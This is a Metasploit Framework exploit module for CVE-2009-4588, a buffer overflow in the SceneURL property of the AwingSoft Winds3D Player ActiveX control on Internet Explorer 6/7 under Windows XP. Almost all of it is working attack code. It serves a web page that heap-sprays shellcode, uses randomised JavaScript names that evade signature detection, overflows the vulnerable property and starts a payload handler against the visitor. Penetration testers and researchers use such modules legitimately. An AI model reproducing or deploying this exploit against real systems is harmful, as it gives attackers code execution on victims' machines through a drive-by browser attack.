##
# $Id: awingsoft_web3d_bof.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# awingsoft_web3d_bof.rb
#
# AwingSoft Web3D Player 'SceneURL()' Buffer Overflow exploit for the Metasploit Framework
#
# Tested successfully on the following platforms:
#  - Internet Explorer 6, Windows XP SP2
#  - Internet Explorer 7, Windows XP SP3
#
# WindsPly.ocx versions tested:
#  - 3.0.0.5
#  - 3.5.0.0
#  - 3.6.0.0 (beta)
#
# Trancer
# http://www.rec-sec.com
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'AwingSoft Winds3D Player SceneURL Buffer Overflow',
			'Description'    => %q{
					This module exploits a data segment buffer overflow within Winds3D Viewer of
				AwingSoft Awakening 3.x (WindsPly.ocx v3.6.0.0). This ActiveX is a plugin of
				AwingSoft Web3D Player.
				By setting an overly long value to the 'SceneURL' property, an attacker can
				overrun a buffer and execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'shinnai <shinnai[at]autistici.org>',	# Original exploit [see References]
					'Trancer <mtrancer[at]gmail.com>',	  	# Metasploit implementation
					'jduck'
				],
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2009-4588' ],
					[ 'OSVDB', '60017' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/9116' ],
					[ 'URL', 'http://www.shinnai.net/exploits/nsGUdeley3EHfKEV690p.txt' ],
					[ 'URL', 'http://www.rec-sec.com/2009/07/28/awingsoft-web3d-buffer-overflow/' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process'
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'StackAdjustment' => -3500
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# data segment size: 76180
					# crasher offsets: 2640, 2712, 8984, 68420, 68424
					[ 'Windows XP SP0-SP3 / IE 6.0 SP0-2 & IE 7.0', { 'Ret' => 0x0C0C0C0C, 'Offset' => 8984 } ]
				],
			'DisclosureDate' => 'Jul 10 2009',
			'DefaultTarget'  => 0))
	end

	def on_request_uri(cli, request)

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Setup exploit buffers
		nops 	  = Rex::Text.to_unescape([target.ret].pack('V'))
		ret  	  = Rex::Text.uri_encode([target.ret].pack('V'))
		blocksize = 0x40000
		fillto    = 500
		offset 	  = target['Offset']

		# Randomize the javascript variable names
		winds3d      = rand_text_alpha(rand(100) + 1)
		j_shellcode  = rand_text_alpha(rand(100) + 1)
		j_nops       = rand_text_alpha(rand(100) + 1)
		j_ret        = rand_text_alpha(rand(100) + 1)
		j_headersize = rand_text_alpha(rand(100) + 1)
		j_slackspace = rand_text_alpha(rand(100) + 1)
		j_fillblock  = rand_text_alpha(rand(100) + 1)
		j_block      = rand_text_alpha(rand(100) + 1)
		j_memory     = rand_text_alpha(rand(100) + 1)
		j_counter    = rand_text_alpha(rand(30) + 2)

		# we must leave the page, so we use http-equiv and javascript refresh methods
		html = %Q|<html>
<head><meta http-equiv="refresh" content="1;URL=#{get_resource}"></head>
<object classid='clsid:17A54E7D-A9D4-11D8-9552-00E04CB09903' id='#{winds3d}'></object>
<script>
#{j_shellcode}=unescape('#{shellcode}');
#{j_nops}=unescape('#{nops}');
#{j_headersize}=20;
#{j_slackspace}=#{j_headersize}+#{j_shellcode}.length;
while(#{j_nops}.length<#{j_slackspace})#{j_nops}+=#{j_nops};
#{j_fillblock}=#{j_nops}.substring(0,#{j_slackspace});
#{j_block}=#{j_nops}.substring(0,#{j_nops}.length-#{j_slackspace});
while(#{j_block}.length+#{j_slackspace}<#{blocksize})#{j_block}=#{j_block}+#{j_block}+#{j_fillblock};
#{j_memory}=new Array();
for(#{j_counter}=0;#{j_counter}<#{fillto};#{j_counter}++)#{j_memory}[#{j_counter}]=#{j_block}+#{j_shellcode};

var #{j_ret} = unescape('#{ret}');
while (#{j_ret}.length <= #{offset}) { #{j_ret} = #{j_ret} + unescape('#{ret}'); }
#{winds3d}.SceneURL = #{j_ret};
setTimeout('window.location = "#{get_resource}";', 500);
</script>
</html>
|

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response(cli, html, { 'Content-Type' => 'text/html' })

		# Handle the payload
		handler(cli)
	end
end
